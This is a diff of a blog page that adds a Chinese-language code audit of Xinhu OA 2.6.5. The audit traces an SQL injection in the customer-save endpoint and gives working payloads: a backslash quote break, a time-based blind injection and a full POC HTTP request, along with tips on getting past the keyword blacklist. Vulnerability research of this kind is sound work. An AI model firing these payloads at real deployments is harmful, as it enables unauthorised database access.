@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="friends, Made by jcxj">
+    <meta name="keywords" content="信呼oa审计, Made by jcxj">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>friends | Made by jcxj</title>
+    <title>信呼oa审计 | Made by jcxj</title>
     <link rel="icon" type="image/png" href="/jcxj/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/jcxj/libs/awesome/css/all.css">
@@ -203,12 +203,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/jcxj/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/jcxj/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">friends</h1>
+                    <h1 class="description center-align post-title">信呼oa审计</h1>
                 </div>
             </div>
         </div>
@@ -336,28 +336,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-09-20
+                    2024-12-11
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2023-03-06
+                    2024-12-11
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    0
+                    866
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    1 Min
+                    4 Min
                 </div>
                 
 
@@ -380,7 +380,111 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h1 id="0-源码下载"><a href="#0-源码下载" class="headerlink" title="0.源码下载"></a>0.源码下载</h1><p><a target="_blank" rel="noopener" href="https://github.com/rainrocka/xinhu.git">https://github.com/rainrocka/xinhu.git</a></p>
+<p>版本：信呼OA的2.6.5版本</p>
+<h1 id="1-客户管理处存在sql注入"><a href="#1-客户管理处存在sql注入" class="headerlink" title="1.客户管理处存在sql注入"></a>1.客户管理处存在sql注入</h1><p>新增客户</p>
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211135947241.png" class="" title="image-20241211135947241">
+
+<h2 id="抓包查看路由"><a href="#抓包查看路由" class="headerlink" title="抓包查看路由"></a>抓包查看路由</h2><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211141944099.png" class="" title="image-20241211141944099">
+
+<h2 id="源码定位"><a href="#源码定位" class="headerlink" title="源码定位"></a>源码定位</h2><p>index.php#34 引用了View.php</p>
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211142000159.png" class="" title="image-20241211142000159">
+
+<p>View.php中对参数解析，再引用</p>
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211142052217.png" class="" title="image-20241211142052217">
+
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;index.php?a&#x3D;save&amp;m&#x3D;mode_customer|input&amp;d&#x3D;flow&amp;ajaxbool&#x3D;true&amp;rnd&#x3D;792761<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>变为</p>
+<pre class="line-numbers language-none"><code class="language-none">$m &#x3D; mode_customer
+$_m&#x3D;input
+$a&#x3D;save
+$actname &#x3D; saveAjax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211142028415.png" class="" title="image-20241211142028415">
+
+<p>如上图，最终调用 mode_customerClassAction.saveAjax</p>
+<p>由于mode_customerClassAction没有saveAjax，因此最终调用inputAction.saveAjax</p>
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211142519559.png" class="" title="image-20241211142519559">
+
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211142601009.png" class="" title="image-20241211142601009">
+
+<p>在241进行数据库保存，为了方便调试，将$uaarr输出进行参数查看</p>
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211143500206.png" class="" title="image-20241211143500206">
+
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>在新增客户中，随便找个参数，通过添加 \ 进行绕过</p>
+<pre class="line-numbers language-none"><code class="language-none">linkname&#x3D;a3\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>payload为</p>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;0&amp;sxuanfileid&#x3D;&amp;name&#x3D;1234&amp;laiyuan&#x3D;%E7%BD%91%E4%B8%8A%E5%BC%80%E6%8B%93&amp;unitname&#x3D;&amp;type&#x3D;%E4%BA%92%E8%81%94%E7%BD%91&amp;linkname&#x3D;a3\&amp;email&#x3D;&amp;tel&#x3D;22&amp;mobile&#x3D;33&amp;sheng&#x3D;&amp;shi&#x3D;44&amp;address&#x3D;&amp;addresslatlng&#x3D;&amp;shibieid&#x3D;&amp;openbank&#x3D;&amp;cardid&#x3D;&amp;routeline&#x3D;&amp;explain&#x3D;&amp;fileid&#x3D;&amp;status&#x3D;1&amp;isstat&#x3D;0&amp;isgys&#x3D;0&amp;sysmodeid&#x3D;7&amp;sysmodenum&#x3D;customer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>此时返回包出现报错</p>
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211143612285.png" class="" title="image-20241211143612285">
+
+<p>进入日志查看具体的sql语法</p>
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211143635809.png" class="" title="image-20241211143635809">
+
+<p>sql语法使用单引号闭合并且没有对 \ 进行处理导致引号错误</p>
+<p>改一下payload</p>
+<pre class="line-numbers language-none"><code class="language-none">linkname&#x3D;a3\
+explain&#x3D;1%20--%20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>报错如下图</p>
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211144333907.png" class="" title="image-20241211144333907">
+
+<p>将语句复制到sql查询中查看，此时引号闭合且 1 成功逃逸</p>
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211144349374.png" class="" title="image-20241211144349374">
+
+<p>将explain中的1删掉</p>
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211144439955.png" class="" title="image-20241211144439955">
+
+<p>成功添加用户</p>
+<p>将1改成时间盲注的语句</p>
+<pre class="line-numbers language-none"><code class="language-none">linkname&#x3D;a3\
+explain&#x3D;;(select(if(1&#x3D;1,(benchmark(10000000,SHA1(&#39;Hello&#39;))),2)&#x3D;1))%20--%20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>还是报错了</p>
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211145715648.png" class="" title="image-20241211145715648">
+
+<p>时间盲注语句在sql查询中能正常执行，但在这里不行。说明可能是分号的问题，将分号去掉改成逗号</p>
+<pre class="line-numbers language-none"><code class="language-none">linkname&#x3D;a3\
+explain&#x3D;,&#96;explain&#96;&#x3D;(select(if(1&#x3D;1,(benchmark(10000000,SHA1(111))),2)&#x3D;1))%20--%20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211145739182.png" class="" title="image-20241211145739182">
+
+<p>成功盲注</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;index.php?a&#x3D;save&amp;m&#x3D;mode_customer|input&amp;d&#x3D;flow&amp;ajaxbool&#x3D;true&amp;rnd&#x3D;131480 HTTP&#x2F;1.1
+Host: 127.0.0.1
+Content-Length: 368
+sec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;119&quot;, &quot;Not?A_Brand&quot;;v&#x3D;&quot;24&quot;
+Accept: *&#x2F;*
+Content-Type: application&#x2F;x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;119.0.6045.123 Safari&#x2F;537.36
+sec-ch-ua-platform: &quot;Windows&quot;
+Origin: http:&#x2F;&#x2F;127.0.0.1
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http:&#x2F;&#x2F;127.0.0.1&#x2F;?a&#x3D;lu&amp;m&#x3D;input&amp;d&#x3D;flow&amp;num&#x3D;customer&amp;mid&#x3D;0&amp;callback&#x3D;opegs1733901100171_7188
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q&#x3D;0.9
+Cookie: deviceid&#x3D;1733896888157; xinhu_ca_adminuser&#x3D;admin; xinhu_ca_rempass&#x3D;1; PHPSESSID&#x3D;0gjig9u51nhbp8m7cijt12e520; xinhu_mo_adminid&#x3D;dv0cj0xxb0cx0xjx0dm0mu0xxd0vj0xll0mj0xju0md0mx0mw0cd012; xinhu_ca_adminpass&#x3D;lw0lx0li0hhj0wx0lx0ei0hio0xx0hoj0xx0el06
+Connection: close
+
+id&#x3D;0&amp;sxuanfileid&#x3D;&amp;name&#x3D;11&amp;laiyuan&#x3D;%E7%94%B5%E8%AF%9D%E5%BC%80%E6%8B%93&amp;unitname&#x3D;&amp;type&#x3D;%E4%BA%92%E8%81%94%E7%BD%91&amp;linkname&#x3D;a3\&amp;email&#x3D;&amp;tel&#x3D;&amp;mobile&#x3D;&amp;sheng&#x3D;&amp;shi&#x3D;&amp;address&#x3D;&amp;addresslatlng&#x3D;&amp;shibieid&#x3D;&amp;openbank&#x3D;&amp;cardid&#x3D;&amp;routeline&#x3D;&amp;explain&#x3D;,&#96;explain&#96;&#x3D;(select(if(1&#x3D;1,(benchmark(10000000,SHA1(111))),2)&#x3D;1))%20--%20&amp;fileid&#x3D;&amp;status&#x3D;1&amp;isstat&#x3D;0&amp;isgys&#x3D;0&amp;sysmodeid&#x3D;7&amp;sysmodenum&#x3D;customer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>测试过程中发现黑名单，可以直接去源码中搜被过滤的字符串从而找到黑名单;加逗号是因为php数组以逗号隔开元素</p>
+<pre class="line-numbers language-none"><code class="language-none">select被过滤 -&gt; select,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211150215134.png" class="" title="image-20241211150215134">
+
+<img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211150258765.png" class="" title="image-20241211150258765">
+
+
                 
             </div>
             <hr/>
@@ -406,7 +510,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://jcxj.github.io/jcxj/jcxj/friends/index.html">https://jcxj.github.io/jcxj/jcxj/friends/index.html</a>
+                    <a href="https://jcxj.github.io/jcxj/jcxj/2024/12/11/xin-hu-oa-shen-ji/">https://jcxj.github.io/jcxj/jcxj/2024/12/11/xin-hu-oa-shen-ji/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -633,18 +737,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;Current
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/jcxj/friends/index.html">
+                <a href="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/">
                     <div class="card-image">
                         
                         
-                        <img src="/jcxj/medias/featureimages/19.jpg" class="responsive-img" alt="friends">
+                        <img src="/jcxj/medias/featureimages/19.jpg" class="responsive-img" alt="open-webui_ssrf漏洞">
                         
-                        <span class="card-title">friends</span>
+                        <span class="card-title">open-webui_ssrf漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -654,9 +757,9 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-20
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-03-01
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -665,7 +768,6 @@
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
@@ -673,16 +775,16 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                Current&nbsp;<i class="far fa-dot-circle"></i>
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/jcxj/friends/index.html">
+                <a href="/jcxj/2024/09/09/eladmin-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/jcxj/medias/featureimages/19.jpg" class="responsive-img" alt="friends">
+                        <img src="/jcxj/medias/featureimages/16.jpg" class="responsive-img" alt="eladmin-复现">
                         
-                        <span class="card-title">friends</span>
+                        <span class="card-title">eladmin-复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -693,7 +795,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-09-09
                             </span>
                         <span class="publish-author">
                             
@@ -703,7 +805,6 @@
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
